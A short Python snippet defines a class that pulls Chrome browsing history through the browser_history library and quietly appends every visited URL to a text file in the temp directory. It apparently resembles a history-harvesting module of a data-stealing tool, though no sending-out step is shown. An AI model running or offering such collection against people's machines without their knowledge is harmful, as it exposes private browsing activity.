from browser_history.browsers import Chrome
from os import remove , path , chdir , environ , getcwd

class DumpHistory:
	def __init__(self):
		self.drive = Chrome()
	def Mido(self):
		outputs = self.drive.fetch_history()
		paTh    = chdir(environ["temp"])
		file_dumabs = open("dump_History.txt", mode="a")
		outputs_dump = outputs.histories
		for i in outputs_dump:
			file_dumabs.writelines(i[1]+"\n\n")
		file_dumabs.close()

